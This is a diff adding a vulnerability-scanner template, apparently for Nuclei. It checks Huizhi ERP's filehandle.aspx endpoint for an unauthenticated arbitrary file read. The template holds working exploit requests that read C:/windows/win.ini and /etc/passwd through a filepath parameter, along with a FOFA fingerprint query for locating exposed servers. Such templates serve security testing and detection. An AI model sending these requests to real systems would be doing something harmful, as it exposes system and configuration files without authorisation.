@@ -1,0 +1,28 @@
+id: yfhuizhi-filehandle-lfi
+info:
+  name: 汇智 ERP filehandle.aspx - fileread
+  author: leadlife
+  severity: high
+  description: 汇智 ERP filehandle.aspx 接口处任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态
+  reference: 
+    - https://github.com/wy876/POC/blob/1ff8a0f8154bdaf1dbf0148f25af1d2d38d24f96/%E6%B1%87%E6%99%BAERP%E6%8E%A5%E5%8F%A3filehandle.aspx%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: icon_hash="-642591392"
+  tags: yfhuizhi,lfi,fileread
+
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/nssys/common/filehandle.aspx?filepath=C%3a%2fwindows%2fwin%2eini"
+      - "{{BaseURL}}/nssys/common/filehandle.aspx?filepath=%2Fetc%2Fpasswd"
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
